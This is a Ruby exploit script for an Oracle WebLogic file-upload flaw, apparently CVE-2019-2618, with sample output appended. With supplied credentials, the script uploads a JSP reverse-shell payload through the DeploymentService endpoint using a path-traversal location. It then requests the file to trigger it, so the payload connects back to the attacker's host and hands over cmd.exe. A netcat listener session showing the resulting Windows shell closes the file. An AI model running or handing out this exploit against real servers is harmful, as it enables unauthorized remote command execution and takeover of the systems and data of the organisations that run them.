#!/usr/bin/env ruby 
# https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html

require 'rex'
require 'rex/mime'

rhost = ARGV[0]
lhost = ARGV[1]
user  = ARGV[2]
pass  = ARGV[3]

def usage 
    puts "[*] #{$0} <target> <callback> <user> <pass>"
    exit
end

usage if ARGV.size < 4


begin

sock =  Rex::Proto::Http::Client.new(rhost, 7001, context = {}, ssl = false)


jsp_payload = %Q|
			<%@page import="java.lang.*"%>
			<%@page import="java.util.*"%>
			<%@page import="java.io.*"%>
			<%@page import="java.net.*"%>

			<%
				class StreamConnector extends Thread
				{
					InputStream is;
					OutputStream os;

					StreamConnector( InputStream is, OutputStream os )
					{
						this.is = is;
						this.os = os;
					}

					public void run()
					{
						BufferedReader in  = null;
						BufferedWriter out = null;
						try
						{
							in  = new BufferedReader( new InputStreamReader( this.is ) );
							out = new BufferedWriter( new OutputStreamWriter( this.os ) );
							char buffer[] = new char[8192];
							int length;
							while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
							{
								out.write( buffer, 0, length );
								out.flush();
							}
						} catch( Exception e ){}
						try
						{
							if( in != null )
								in.close();
							if( out != null )
								out.close();
						} catch( Exception e ){}
					}
				}

				try
				{
					Socket socket = new Socket( "#{lhost}", 65535 );
					Process process = Runtime.getRuntime().exec( "cmd.exe" );
					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
				} catch( Exception e ) {}
			%>|


#where = "/tmp/_WL_internal/bea_wls_internal/bea_wls_internal/9j4dqk/war"
where = "\\..\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war"

post_data = Rex::MIME::Message.new
post_data.add_part(jsp_payload, 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"mc.jsp\"")

res = sock.request_cgi(
	{
		'uri'     => "/bea_wls_deployment_internal/DeploymentService",
		'version' => '1.0',
		'method'  => 'POST',
		'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
		'data'    => post_data.to_s,
                'headers' => {
                              'username' => user,
                              'password' => pass,
                              'serverName' => "#{rhost}",
                              'wl_request_type' => "app_upload",
                              'wl_upload_application_name' => where,
                              'archve' => "true",
                },

	})

sock.send_request(res)
recv = sock.read_response()

 if recv.code == 200 
     res = sock.request_cgi({'uri' => "/bea_wls_internal/mc.jsp",})
     sock.send_request(res)
     recv = sock.read_response()
 else
     puts "[!] Failed..."
 end

rescue => e
puts "[!] #{e.to_s}"
end
__END__
$ ruby weblogic_CVE_2019_2618.rb 192.168.1.135 192.168.3.210 weblogic 1qaz\!QAZ

....

$ nc -v -l 65535
Listening on [0.0.0.0] (family 0, port 65535)
Connection from [192.168.3.205] port 65535 [tcp/*] accepted (family 2, sport 37686)
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain>
